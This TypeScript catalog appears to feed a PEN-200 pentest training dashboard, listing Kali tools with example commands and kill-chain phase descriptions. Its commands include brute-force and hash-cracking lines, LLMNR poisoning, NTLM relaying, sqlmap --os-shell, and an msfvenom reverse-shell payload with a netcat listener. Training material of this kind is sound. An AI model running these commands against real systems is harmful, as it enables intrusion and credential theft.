// Kali offensive tool catalog used by PentestIncidentDetail.
// Mirrors src/ops/modules/k8s/toolStack.ts but for the PEN-200 stack.

import type { AttackTool, PentestPhaseId } from "./types";

export interface AttackToolDescriptor {
  tool: AttackTool;
  category: "Recon" | "Web" | "Exploit" | "Post-Exploitation" | "Cracking" | "Auxiliary" | "Reporting";
  module: "PEN-M1" | "PEN-M2" | "PEN-M3" | "PEN-M5" | "PEN-M6" | "PEN-M7";
  module_title: string;
  phases: PentestPhaseId[];
  purpose: string;
  commands: string[];
  why_it_matters: string;
}

export const TOOL_CATALOG: Record<AttackTool, AttackToolDescriptor> = {
  nmap: {
    tool: "nmap", category: "Recon", module: "PEN-M3", module_title: "M3 · Information Gathering",
    phases: ["recon"],
    purpose: "Port and service discovery scanner. Reveals attack surface, OS fingerprints, and version banners.",
    commands: ["nmap -sV -sC -p- 10.10.10.5", "nmap --script vuln 10.10.10.5", "nmap -sU --top-ports 50 10.10.10.5"],
    why_it_matters: "Every external engagement starts with nmap. The version banners drive exploit lookups and prioritisation.",
  },
  gobuster: {
    tool: "gobuster", category: "Web", module: "PEN-M5", module_title: "M5 · Intro to Web Applications",
    phases: ["recon"],
    purpose: "Brute-forces directories, vhosts and DNS subdomains using wordlists.",
    commands: ["gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt", "gobuster vhost -u target -w subs.txt"],
    why_it_matters: "Hidden /admin or /backup paths are the most common entry on web boxes — gobuster surfaces them in minutes.",
  },
  ffuf: {
    tool: "ffuf", category: "Web", module: "PEN-M5", module_title: "M5 · Intro to Web Applications",
    phases: ["recon", "exploit"],
    purpose: "Fast HTTP fuzzer for parameters, paths and authentication endpoints.",
    commands: ["ffuf -u http://target/FUZZ -w wordlist.txt", "ffuf -u 'http://t/api?id=FUZZ' -w nums.txt -mc 200"],
    why_it_matters: "Parameter mining with ffuf finds hidden APIs that gobuster misses.",
  },
  burp: {
    tool: "burp", category: "Web", module: "PEN-M5", module_title: "M5 · Intro to Web Applications",
    phases: ["recon", "exploit", "weaponize"],
    purpose: "Intercepting HTTP proxy with Repeater, Intruder and Scanner.",
    commands: ["proxy 127.0.0.1:8080", "send to Repeater", "Intruder → Sniper attack"],
    why_it_matters: "All non-trivial web exploitation needs Burp Repeater to craft payloads byte-for-byte.",
  },
  sqlmap: {
    tool: "sqlmap", category: "Exploit", module: "PEN-M7", module_title: "M7 · SQL Injection",
    phases: ["exploit", "action"],
    purpose: "Automated SQL injection detection and database exploitation.",
    commands: ["sqlmap -u 'http://t/p?id=1' --batch --dbs", "sqlmap -u ... -D shop --tables", "sqlmap -u ... --os-shell"],
    why_it_matters: "Once a single parameter is vulnerable, sqlmap can escalate to file read, RCE and credential dumps.",
  },
  hydra: {
    tool: "hydra", category: "Cracking", module: "PEN-M3", module_title: "M3 · Information Gathering",
    phases: ["exploit"],
    purpose: "Online credential brute-forcer for SSH, FTP, HTTP forms, SMB and more.",
    commands: ["hydra -L users.txt -P rockyou.txt ssh://target", "hydra -l admin -P pw.txt target http-post-form '/login:user=^USER^&pass=^PASS^:F=invalid'"],
    why_it_matters: "Cheap credentials are still the #1 internal foothold. Hydra automates the spray.",
  },
  hashcat: {
    tool: "hashcat", category: "Cracking", module: "PEN-M3", module_title: "M3 · Information Gathering",
    phases: ["action"],
    purpose: "GPU-accelerated offline hash cracker.",
    commands: ["hashcat -m 1000 ntlm.hash rockyou.txt", "hashcat -m 13100 krb5tgs.hash rockyou.txt -r best64.rule"],
    why_it_matters: "Kerberoasting / NetNTLMv2 hashes are useless until hashcat cracks them — fast crack = fast lateral movement.",
  },
  john: {
    tool: "john", category: "Cracking", module: "PEN-M3", module_title: "M3 · Information Gathering",
    phases: ["action"],
    purpose: "CPU-based hash cracker with smart format detection.",
    commands: ["john --wordlist=rockyou.txt hash.txt", "john --show hash.txt"],
    why_it_matters: "Fallback when hashcat doesn't support a format (htpasswd, /etc/shadow odd variants).",
  },
  msfconsole: {
    tool: "msfconsole", category: "Exploit", module: "PEN-M1", module_title: "M1 · Intro to Cybersecurity",
    phases: ["exploit", "install", "c2"],
    purpose: "Metasploit Framework — exploit, payload and post-exploitation orchestrator.",
    commands: ["search type:exploit cve:2021", "use exploit/multi/handler", "set payload windows/x64/meterpreter/reverse_https"],
    why_it_matters: "Provides reliable, well-tested exploits and Meterpreter for post-exploitation pivots.",
  },
  msfvenom: {
    tool: "msfvenom", category: "Exploit", module: "PEN-M1", module_title: "M1 · Intro to Cybersecurity",
    phases: ["weaponize"],
    purpose: "Generates standalone payloads in arbitrary formats (exe, elf, php, asp, war, raw).",
    commands: ["msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o pay.exe"],
    why_it_matters: "Custom payload generation is mandatory when off-the-shelf binaries are AV-detected.",
  },
  searchsploit: {
    tool: "searchsploit", category: "Recon", module: "PEN-M3", module_title: "M3 · Information Gathering",
    phases: ["weaponize"],
    purpose: "Offline copy of Exploit-DB searchable from the CLI.",
    commands: ["searchsploit apache 2.4", "searchsploit -m linux/remote/49757.py"],
    why_it_matters: "After nmap surfaces a service version, searchsploit is the fastest pivot to a PoC exploit.",
  },
  smbclient: {
    tool: "smbclient", category: "Recon", module: "PEN-M3", module_title: "M3 · Information Gathering",
    phases: ["recon", "action"],
    purpose: "CLI client for SMB shares — anonymous enumeration, file download, password spraying.",
    commands: ["smbclient -L //10.10.10.5 -N", "smbclient //10.10.10.5/backups -U guest"],
    why_it_matters: "Anonymous-readable shares regularly contain clear-text credentials in backup / config files.",
  },
  enum4linux: {
    tool: "enum4linux", category: "Recon", module: "PEN-M3", module_title: "M3 · Information Gathering",
    phases: ["recon"],
    purpose: "SMB / RPC / LDAP enumeration wrapper around rpcclient and net commands.",
    commands: ["enum4linux -a 10.10.10.5", "enum4linux-ng -A 10.10.10.5"],
    why_it_matters: "One command yields users, shares, password policy and group memberships — the basis for any AD attack chain.",
  },
  wpscan: {
    tool: "wpscan", category: "Web", module: "PEN-M5", module_title: "M5 · Intro to Web Applications",
    phases: ["recon", "exploit"],
    purpose: "WordPress vulnerability scanner — plugins, themes, users, brute-force.",
    commands: ["wpscan --url http://target --enumerate u,p,t", "wpscan --url http://target -U admin -P rockyou.txt"],
    why_it_matters: "WordPress sites account for ~40% of public web boxes — wpscan covers them in a single pass.",
  },
  nikto: {
    tool: "nikto", category: "Web", module: "PEN-M5", module_title: "M5 · Intro to Web Applications",
    phases: ["recon"],
    purpose: "Web server misconfiguration scanner with 7000+ signatures.",
    commands: ["nikto -h http://target", "nikto -h target -p 8080 -ssl"],
    why_it_matters: "Surfaces low-hanging fruit (default credentials, exposed test pages, CGI bugs) before deeper enumeration.",
  },
  amass: {
    tool: "amass", category: "Recon", module: "PEN-M3", module_title: "M3 · Information Gathering",
    phases: ["recon"],
    purpose: "Subdomain enumeration via OSINT, brute force and certificate transparency.",
    commands: ["amass enum -passive -d target.com", "amass enum -active -d target.com -p 80,443"],
    why_it_matters: "External engagements live and die by subdomain coverage — amass plus crt.sh is the gold standard.",
  },
  subfinder: {
    tool: "subfinder", category: "Recon", module: "PEN-M3", module_title: "M3 · Information Gathering",
    phases: ["recon"],
    purpose: "Fast passive subdomain enumeration.",
    commands: ["subfinder -d target.com -all -silent"],
    why_it_matters: "Lighter, faster complement to amass — pipe both outputs into httpx for live-host triage.",
  },
  dig: {
    tool: "dig", category: "Recon", module: "PEN-M3", module_title: "M3 · Information Gathering",
    phases: ["recon"],
    purpose: "DNS query tool. Used to inspect CNAMEs, SOA records, and zone transfer attempts.",
    commands: ["dig @nsX.target.com target.com axfr", "dig CNAME staging.target.com"],
    why_it_matters: "A dangling CNAME pointing at a deleted SaaS tenant equals a subdomain takeover.",
  },
  curl: {
    tool: "curl", category: "Auxiliary", module: "PEN-M5", module_title: "M5 · Intro to Web Applications",
    phases: ["recon", "exploit", "verify" as any],
    purpose: "Scriptable HTTP client — payload crafting, header testing, exploit PoC delivery.",
    commands: ["curl -i -X POST http://t/login -d 'u=admin&p=admin'", "curl -H 'Host: admin.t' http://t/"],
    why_it_matters: "Every web exploit chain ends with a one-line curl PoC the client can reproduce.",
  },
  openvas: {
    tool: "openvas", category: "Auxiliary", module: "PEN-M3", module_title: "M3 · Information Gathering",
    phases: ["recon"],
    purpose: "Network vulnerability scanner with authenticated and unauthenticated checks.",
    commands: ["openvas-start", "Run 'Full and fast' scan"],
    why_it_matters: "Provides triage data for large IP ranges. Output must be hand-validated before exploitation.",
  },
  responder: {
    tool: "responder", category: "Post-Exploitation", module: "PEN-M3", module_title: "M3 · Information Gathering",
    phases: ["recon", "exploit"],
    purpose: "LLMNR / NBT-NS poisoner that captures NetNTLMv2 hashes on internal networks.",
    commands: ["responder -I eth0 -A"],
    why_it_matters: "On flat internal networks, Responder yields crackable hashes within minutes of plugging in.",
  },
  ntlmrelayx: {
    tool: "ntlmrelayx", category: "Post-Exploitation", module: "PEN-M3", module_title: "M3 · Information Gathering",
    phases: ["exploit", "action"],
    purpose: "Relays captured NTLM authentication to a target that has SMB signing disabled.",
    commands: ["ntlmrelayx.py -tf targets.txt -smb2support -socks"],
    why_it_matters: "Cracking is optional — relaying directly yields shell on the relayed host.",
  },
  "evil-winrm": {
    tool: "evil-winrm", category: "Post-Exploitation", module: "PEN-M1", module_title: "M1 · Intro to Cybersecurity",
    phases: ["c2", "action"],
    purpose: "Interactive WinRM shell for post-exploitation on Windows targets.",
    commands: ["evil-winrm -i 10.10.10.5 -u svc -p 'P@ss'"],
    why_it_matters: "Cleaner alternative to PSExec — bypasses many EDR detections that flag SMB-based shells.",
  },
  "kali-shell": {
    tool: "kali-shell", category: "Auxiliary", module: "PEN-M1", module_title: "M1 · Intro to Cybersecurity",
    phases: ["scope", "recon", "weaponize", "exploit", "install", "c2", "action", "cleanup"],
    purpose: "Generic Kali zsh prompt — used for scripting, file edits and pipeline plumbing.",
    commands: ["nc -lvnp 4444", "python3 -m http.server 8000"],
    why_it_matters: "Every other tool is glued together by zsh one-liners. Comfort here multiplies all other capabilities.",
  },
  "report-template": {
    tool: "report-template", category: "Reporting", module: "PEN-M2", module_title: "M2 · Pentest Report Writing",
    phases: ["report"],
    purpose: "Markdown / Word template with severity matrix, CVSS calculator and reproduction-step layout.",
    commands: ["pandoc finding.md -o finding.pdf"],
    why_it_matters: "OSCP+ submission requires reproducible evidence — without a template, evidence ends up in screenshots only.",
  },
};

// Default phase narrative if an incident doesn't override it.
export const PHASE_DEFAULTS: Record<PentestPhaseId, string> = {
  scope:     "Rules of engagement, IP ranges and authorisation reviewed. Scope captured in the engagement letter.",
  recon:     "Passive and active enumeration to build the attack surface map.",
  weaponize: "Exploit located or built (msfvenom payload, sqlmap tamper, custom PoC).",
  deliver:   "Payload delivered to the target — HTTP POST, phishing link or upload form.",
  exploit:   "Vulnerability triggered, code executed in the target context.",
  install:   "Foothold installed: webshell, reverse shell, scheduled task, cron entry.",
  c2:        "Persistent communication channel established (Meterpreter, evil-winrm, beacon).",
  action:    "Objectives executed: loot collected, lateral movement, privilege escalation.",
  cleanup:   "Artifacts removed where in-scope; persistence catalogued for the client.",
  report:    "Finding written up with CVSS, reproduction steps, evidence and remediation.",
};
